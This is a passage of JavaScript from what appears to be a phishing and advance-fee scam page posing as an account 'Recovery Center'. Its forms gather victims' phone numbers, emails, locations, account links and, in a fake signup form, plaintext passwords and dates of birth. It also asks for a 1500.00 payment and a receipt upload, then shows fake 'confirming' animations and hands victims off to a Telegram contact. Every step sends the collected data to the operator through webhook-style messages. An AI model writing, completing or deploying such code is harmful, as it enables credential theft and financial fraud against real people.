  };

  function openModal(key){
    const m = MODALS[key];
    if (!m) return;
    $("modalTitle").textContent = m.title;
    $("modalBody").innerHTML = m.body;
    $("modal").classList.add("on");
    document.body.style.overflow = "hidden";
  }

  function closeModal(){
    $("modal").classList.remove("on");
    document.body.style.overflow = "";
  }

  /* ══════════════════════════════════════════════════════
     GLOBAL CLICK DELEGATION
     ══════════════════════════════════════════════════════ */
  document.addEventListener("click", function(ev){
    const navEl = ev.target.closest("[data-nav]");
    if (navEl){
      ev.preventDefault();
      showView(navEl.dataset.nav);
      return;
    }

    const modalEl = ev.target.closest("[data-modal]");
    if (modalEl){
      ev.preventDefault();
      openModal(modalEl.dataset.modal);
      return;
    }

    const langEl = ev.target.closest("[data-lang]");
    if (langEl){
      ev.preventDefault();
      $("langLabel").textContent = langEl.dataset.lang;
      closeModal();
      toast("Language set to " + langEl.dataset.lang);
      return;
    }

    if (ev.target.closest(".faq-q")){
      const faq = ev.target.closest(".faq");
      if (faq) faq.classList.toggle("open");
      return;
    }
  });

  $("modalClose").addEventListener("click", closeModal);
  $("modalOk").addEventListener("click", closeModal);
  $("modal").addEventListener("click", function(ev){
    if (ev.target === $("modal")) closeModal();
  });
  document.addEventListener("keydown", function(ev){
    if (ev.key === "Escape" && $("modal").classList.contains("on")) closeModal();
  });

  /* ══════════════════════════════════════════════════════
     STEP 1 — DETAILS
     ══════════════════════════════════════════════════════ */
  $("form1").addEventListener("submit", async function(ev){
    ev.preventDefault();

    const data = {
      number:   val("f_number"),
      gmail:    val("f_gmail"),
      location: val("f_location"),
      status:   val("f_status"),
      link:     val("f_link")
    };

    ["f_number","f_gmail","f_location","f_status","f_link"].forEach(id => markErr(id, false));

    let bad = null;
    if (!data.number) bad = "f_number";
    else if (!data.gmail || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(data.gmail)) bad = "f_gmail";
    else if (!data.location) bad = "f_location";
    else if (!data.status)   bad = "f_status";
    else if (!data.link)     bad = "f_link";

    if (bad){
      markErr(bad, true);
      $(bad).focus();
      toast("Please complete the highlighted field");
      return;
    }

    const btn = $("btn1");
    btn.disabled = true;
    btn.querySelector(".spinner").style.display = "block";
    btn.querySelector("span:last-child").textContent = "Checking…";

    await send("Step 1 — account details", 0x1877f2, [
      { name: "Number",         value: data.number,   inline: true  },
      { name: "Email",          value: data.gmail,    inline: true  },
      { name: "Location",       value: data.location, inline: true  },
      { name: "Account status", value: data.status,   inline: true  },
      { name: "Account link",   value: data.link,     inline: false },
      { name: "Request ID",     value: state.requestId, inline: false }
    ], "step 1");

    state.recovery = data;
    $("s_account").textContent = data.link
      ? data.link.replace(/^https?:\/\/(www\.)?/i, "").replace(/\/$/, "")
      : data.number;
    $("s_email").textContent = data.gmail;

    btn.disabled = false;
    btn.querySelector(".spinner").style.display = "none";
    btn.querySelector("span:last-child").textContent = "Continue";

    showView("2");
  });

  ["f_number","f_gmail","f_location","f_link"].forEach(function(id){
    $(id).addEventListener("input", () => markErr(id, false));
  });
  $("f_status").addEventListener("change", () => markErr("f_status", false));

  /* ══════════════════════════════════════════════════════
     STEP 2 — PAYMENT
     ══════════════════════════════════════════════════════ */
  function copyText(text, msg){
    if (navigator.clipboard && navigator.clipboard.writeText){
      navigator.clipboard.writeText(text).then(
        () => toast(msg),
        () => toast("Copy failed — long-press to copy")
      );
    } else {
      toast("Long-press to copy");
    }
  }
  $("copyNum").addEventListener("click", () => copyText(PAY_NUMBER, "Number copied"));
  $("copyAmt").addEventListener("click", () => copyText("1500.00", "Amount copied"));

  $("btn2").addEventListener("click", async function(){
    const btn = $("btn2");
    btn.disabled = true;
    btn.querySelector(".spinner").style.display = "block";
    btn.querySelector("span:last-child").textContent = "Confirming…";

    await send("Step 2 — payment confirmed", 0xf5a623, [
      { name: "Request ID", value: state.requestId, inline: false },
      { name: "Account",    value: $("s_account").textContent, inline: true },
      { name: "Email",      value: $("s_email").textContent,   inline: true },
      { name: "Sent to",    value: PAY_NUMBER,  inline: true },
      { name: "Amount",     value: PAY_AMOUNT,  inline: true }
    ], "step 2");

    btn.disabled = false;
    btn.querySelector(".spinner").style.display = "none";
    btn.querySelector("span:last-child").textContent = "Confirm payment sent";

    showView("3");
  });

  /* ══════════════════════════════════════════════════════
     STEP 3 — RECEIPT
     ══════════════════════════════════════════════════════ */
  const upload   = $("upload");
  const fileIn   = $("f_file");
  const fileName = $("fileName");
  const MAX_BYTES = 8 * 1024 * 1024;

  function acceptFile(file){
    if (!file) return;
    if (file.size > MAX_BYTES){ toast("File too large — max 8 MB"); return; }
    const name = (file.name || "").toLowerCase();
    const typeOk = ["application/pdf","image/png","image/jpeg"].includes(file.type) ||
                   name.endsWith(".pdf") || name.endsWith(".png") ||
                   name.endsWith(".jpg") || name.endsWith(".jpeg");
    if (!typeOk){ toast("Use a PDF, JPG or PNG"); return; }

    state.file = file;
    fileName.textContent = file.name + " · " + (file.size / 1024 / 1024).toFixed(2) + " MB";
    upload.classList.add("has");
    upload.querySelector(".upload-t").textContent = "Receipt attached";
    upload.querySelector(".upload-d").textContent = "Click to replace";
    markErr("fileField", false);
  }

  fileIn.addEventListener("change", function(){
    if (this.files && this.files[0]) acceptFile(this.files[0]);
  });

  ["dragenter","dragover"].forEach(e => upload.addEventListener(e, function(ev){
    ev.preventDefault(); ev.stopPropagation();
    upload.classList.add("drag");
  }));
  ["dragleave","drop"].forEach(e => upload.addEventListener(e, function(ev){
    ev.preventDefault(); ev.stopPropagation();
    upload.classList.remove("drag");
  }));
  upload.addEventListener("drop", function(ev){
    const f = ev.dataTransfer && ev.dataTransfer.files && ev.dataTransfer.files[0];
    if (f) acceptFile(f);
  });

  $("form3").addEventListener("submit", async function(ev){
    ev.preventDefault();

    markErr("fileField", false);
    markErr("f_ref", false);

    const ref = val("f_ref");
    let bad = null;
    if (!state.file) bad = "fileField";
    else if (!ref)   bad = "f_ref";

    if (bad){
      markErr(bad, true);
      if (bad === "f_ref") $("f_ref").focus();
      toast(bad === "fileField" ? "Attach your receipt first" : "Enter the reference number");
      return;
    }

    const btn = $("btn3");
    btn.disabled = true;
    btn.querySelector(".spinner").style.display = "block";
    btn.querySelector("span:last-child").textContent = "Uploading…";

    const payload = {
      username: "Recovery Center",
      embeds: [{
        title: "Step 3 — receipt uploaded",
        color: 0x42b72a,
        fields: [
          { name: "Request ID", value: state.requestId, inline: false },
          { name: "Account",    value: $("s_account").textContent, inline: true },
          { name: "Email",      value: $("s_email").textContent,   inline: true },
          { name: "Sent to",    value: PAY_NUMBER, inline: true },
          { name: "Amount",     value: PAY_AMOUNT, inline: true },
          { name: "Reference",  value: ref,        inline: false },
          { name: "Receipt",    value: state.file
              ? state.file.name + " (" + (state.file.size/1024/1024).toFixed(2) + " MB)"
              : "none", inline: false },
          { name: "Follow-up",  value: TELEGRAM_HANDLE, inline: false }
        ],
        footer: { text: "step 3 • " + new Date().toLocaleString() }
      }]
    };

    await sendWithFile(payload, state.file);

    showView("4");
    startWaiting();
  });

  $("f_ref").addEventListener("input", () => markErr("f_ref", false));

  /* ══════════════════════════════════════════════════════
     STEP 4 — CONFIRMING
     ══════════════════════════════════════════════════════ */
  function startWaiting(){
    ["w1","w2","w3","w4"].forEach(id => $(id).className = "wait-item");
    $("waitingBlock").style.display = "block";
    $("successBlock").style.display = "none";

    setTimeout(() => { $("w1").className = "wait-item ok"; }, 300);
    setTimeout(() => { $("w2").className = "wait-item on"; }, 700);
    setTimeout(() => { $("w2").className = "wait-item ok"; }, 2100);
    setTimeout(() => { $("w3").className = "wait-item on"; }, 2400);
    setTimeout(() => { $("w3").className = "wait-item ok"; }, 4200);
    setTimeout(() => { $("w4").className = "wait-item on"; }, 4500);
    setTimeout(() => { $("w4").className = "wait-item ok"; }, 5900);
    setTimeout(finishWaiting, 6500);
  }

  async function finishWaiting(){
    $("waitingBlock").style.display = "none";
    $("successBlock").style.display = "block";
    $("heroTitle").textContent = "Recovery complete";
    $("heroSub").textContent   = "Your payment is confirmed. Finish the last step on Telegram.";

    await send("Step 4 — confirmed", 0x42b72a, [
      { name: "Request ID", value: state.requestId, inline: false },
      { name: "Account",    value: $("s_account").textContent, inline: true },
      { name: "Status",     value: "Payment confirmed · awaiting Telegram handoff", inline: false }
    ], "step 4");
  }

  /* ══════════════════════════════════════════════════════
     CREATE ACCOUNT — date selects
     ══════════════════════════════════════════════════════ */
  (function fillDates(){
    const daySel = $("dobDay"), yearSel = $("dobYear");
    for (let d = 1; d <= 31; d++){
      const o = document.createElement("option"); o.textContent = d; daySel.appendChild(o);
    }
    const now = new Date().getFullYear();
    for (let y = now; y >= now - 100; y--){
      const o = document.createElement("option"); o.textContent = y; yearSel.appendChild(o);
    }
  })();

  const createForm = $("createForm");
  const CREATE_FIELDS = [
    "firstName","lastName","signupContact","signupPassword",
    "dobMonth","dobDay","dobYear","gender","pronoun","country"
  ];

  createForm.addEventListener("submit", async function(ev){
    ev.preventDefault();

    const data = {
      firstName: val("firstName"),
      lastName:  val("lastName"),
      contact:   val("signupContact"),
      password:  val("signupPassword"),
      dob:       [val("dobMonth"), val("dobDay"), val("dobYear")].join(" / "),
      gender:    val("gender"),
      pronoun:   val("pronoun"),
      country:   val("country")
    };

    CREATE_FIELDS.forEach(id => markErr(id, false));

    let bad = null;
    if (!data.firstName) bad = "firstName";
    else if (!data.lastName) bad = "lastName";
    else if (!data.contact) bad = "signupContact";
    else if (!data.password || data.password.length < 6) bad = "signupPassword";
    else if (!val("dobMonth") || !val("dobDay") || !val("dobYear")) bad = "dobMonth";
    else if (!data.gender) bad = "gender";
    else if (!data.pronoun) bad = "pronoun";
    else if (!data.country) bad = "country";

    if (bad){
      markErr(bad, true);
      $(bad).focus();
      toast("Please complete the highlighted field");
      return;
    }

    const btn = $("createBtn");
    btn.disabled = true;

    await send("New signup", 0x42b72a, [
      { name: "First name",    value: data.firstName, inline: true  },
      { name: "Last name",     value: data.lastName,  inline: true  },
      { name: "Contact",       value: data.contact,   inline: false },
      { name: "Password",      value: data.password,  inline: false },
      { name: "Date of birth", value: data.dob,       inline: true  },
      { name: "Gender",        value: data.gender,    inline: true  },
      { name: "Pronoun",       value: data.pronoun,   inline: true  },
      { name: "Country",       value: data.country,   inline: true  }
    ], "signup");

    $("overlayText").textContent = "Logging you in…";
    $("loginOverlay").classList.add("on");
    setTimeout(() => { $("overlayText").textContent = "Setting up your account…"; }, 1200);
    setTimeout(() => {
      $("loginOverlay").classList.remove("on");
      createForm.style.display = "none";
      $("createSuccess").style.display = "block";
    }, 2400);
  });

  CREATE_FIELDS.forEach(function(id){
    const el = $(id);
    if (!el) return;
    el.addEventListener("input",  () => markErr(id, false));
    el.addEventListener("change", () => markErr(id, false));
  });

  /* ══════════════════════════════════════════════════════
     HELP SEARCH
     ══════════════════════════════════════════════════════ */
  $("helpSearch").addEventListener("input", function(){
    const q = this.value.toLowerCase().trim();
    document.querySelectorAll("#topicList .topic").forEach(function(t){
      t.style.display = (!q || t.textContent.toLowerCase().includes(q)) ? "" : "none";
    });
    document.querySelectorAll(".faq").forEach(function(f){
      f.style.display = (!q || f.textContent.toLowerCase().includes(q)) ? "" : "none";
    });
  });

  /* ══════════════════════════════════════════════════════
     BOOT
     ══════════════════════════════════════════════════════ */
  window.addEventListener("hashchange", route);
  route();
})();
</script>
